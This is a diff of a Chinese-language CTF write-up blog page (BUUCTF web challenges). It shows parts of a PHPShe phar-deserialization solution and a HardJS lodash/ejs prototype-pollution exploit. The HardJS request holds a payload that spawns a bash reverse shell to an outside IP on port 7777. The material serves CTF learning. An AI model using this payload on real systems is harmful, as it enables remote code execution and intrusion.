@@ -1,13 +1,179 @@
-<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="referrer" content="no-referrer"><meta name="google-site-verification" content="YKwcqblwsZCg-ylX8b6YPzjmkIRadB3nD8IU3XMN6gg"><title>BUUCTF Web Writeup 8 | Boogiepop Doesn't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
-if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.ttf");
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Doesn't Laugh" type="application/atom+xml">
-</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>BUUCTF Web Writeup 8</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-08T03:36:43.566Z" id="date"> 2023-07-08</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-08T03:35:28.332Z" id="updated"> 2023-07-08</time></div></span></div></div><hr><div id="post-content"><p>八星魔王</p>
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>BUUCTF Web Writeup 8 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="BUUCTF Web Writeup 8 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/07/08/BUUCTF%20Web%20WriteUp%208/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-07-08T03:36:43.566Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/In-Challenge/">In Challenge</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>July</span>
+            <span>8,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">BUUCTF Web Writeup 8</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>八星魔王</p>
 <h1 id="RoarCTF-2019-PHPShe"><a href="#RoarCTF-2019-PHPShe" class="headerlink" title="[RoarCTF 2019]PHPShe"></a>[RoarCTF 2019]PHPShe</h1><p>考点：Phar反序列化、代码审计<br>刷题的时候碰到这种题，太折磨人了我测，因为你刷题的时候刷到代审就是百分百坐牢男孩。<br>通过fuzz当前版本和上一个版本可以发现一个问题，多了一个文件<code>pclzip.class.php</code><br>里面多了一个析构函数</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">extract</span>(PCLZIP_OPT_PATH, <span class="variable">$this</span>-&gt;save_path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>我们可以解压任意一个文件，那不就可以写shell，问题是如何触发反序列化了。这种情况直接无脑考虑phar了。。事实证明就是phar<br>在moban.php里有这一段<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688398541894-f57c2904-0ddb-4122-8404-fb7104857bcb.png#averageHue=%23232626&clientId=u82783a52-f6a6-4&from=paste&height=333&id=u71a9b575&originHeight=416&originWidth=1338&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49618&status=done&style=none&taskId=u1b931983-ea75-4457-ad27-135c708c2ca&title=&width=1070.4" alt="image.png"><br>跟进pe_dirdel<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688398551559-cf872c53-9381-4a5d-bbc5-8d49f5bc4807.png#averageHue=%23232525&clientId=u82783a52-f6a6-4&from=paste&height=269&id=ucd284b02&originHeight=336&originWidth=865&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41777&status=done&style=none&taskId=ud222b4d3-1356-4c83-a1fa-388e13341cf&title=&width=692" alt="image.png"><br>有is_file函数，会触发phar反序列化。那么就没事了。</p>
@@ -34,22 +200,149 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 <p>代码审计发现有一个loadsh，这是存在原型链污染的。然后engine又是ejs，又有render，明显的nodejs ejs原型链污染。<br>Exploit<br>下述请求包发送五次，让他进入else分支，然后访问任意可以触发render的路由，如get</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /add HTTP/1.1</span><br><span class="line">Host: f1b80d64-49d5-449a-a2fe-708744c1ad5e.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 304</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://f1b80d64-49d5-449a-a2fe-708744c1ad5e.node4.buuoj.cn:81</span><br><span class="line">Referer: http://f1b80d64-49d5-449a-a2fe-708744c1ad5e.node4.buuoj.cn:81/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: session=s%3Av4pPTVR_-IwR4rAMOQqJD9OyoX6j6Owg.mCQKcPlGyGUet0YctTKVFHNv7iOgix4pjWZKb8ORc1Y</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;content&quot;: &#123;</span><br><span class="line">        &quot;constructor&quot;: &#123;</span><br><span class="line">            &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>访问<code>/get</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688485810701-31e7eec4-8185-403a-ab83-1d61a509f62a.png#averageHue=%23232120&clientId=u4c80ae33-cbdb-4&from=paste&height=206&id=u742690f4&originHeight=257&originWidth=769&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19090&status=done&style=none&taskId=uee578cfe-0e03-4c69-9efb-34158b8facb&title=&width=615.2" alt="image.png"><br>FLAG在ENV里</p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/13/%E9%BC%A0%E9%BC%A0%E7%9A%84%E6%9A%91%E6%9C%9F%E5%9D%90%E7%89%A2%E6%97%A5%E8%AE%B0/">← Next 鼠鼠的暑期坐牢日记</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">Phar反序列化及其一系列的奇技淫巧 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-PHPShe"><span class="toc-number">1.</span> <span class="toc-text">[RoarCTF 2019]PHPShe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPUCTF-2016-Web-blogsys"><span class="toc-number">2.</span> <span class="toc-text">[SWPUCTF 2016]Web blogsys</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMCTF2020-Web-Check-in"><span class="toc-number">3.</span> <span class="toc-text">[WMCTF2020]Web Check in</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java"><span class="toc-number">4.</span> <span class="toc-text">[羊城杯 2020]A Piece Of Java</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC-ATTACK-TOOL"><span class="toc-number">4.1.</span> <span class="toc-text">JDBC-ATTACK-TOOL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XNUCA2019-Qualifier-HardJS"><span class="toc-number">5.</span> <span class="toc-text">[XNUCA2019]Qualifier]HardJS</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
- el: '#valine'
- , appId: '4KNp8mNp9RkLrDSktdFbmIO8-gzGzoHsz'
- , appKey: 'I3KhKOyWDf9eRRnVEAit98wt' , placeholder: 'This comment is sent by Penguin Logistics.'
- , path: window.location.pathname
-});code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/BUUCTF/" class="tag">#BUUCTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/07/13/%E9%BC%A0%E9%BC%A0%E7%9A%84%E6%9A%91%E6%9C%9F%E5%9D%90%E7%89%A2%E6%97%A5%E8%AE%B0/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">鼠鼠的暑期坐牢日记</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Phar反序列化及其一系列的奇技淫巧</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
